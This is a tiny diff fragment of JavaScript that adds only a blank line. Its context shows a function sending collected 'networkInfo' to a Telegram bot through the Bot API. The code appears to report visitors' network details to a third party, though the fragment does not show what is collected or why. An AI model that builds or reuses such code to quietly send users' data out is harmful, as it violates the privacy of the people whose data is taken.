@@ -102,6 +102,7 @@
       }
       function sendToTelegram(networkInfo) {
         
+
         const message = formatTelegramMessage(networkInfo);
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
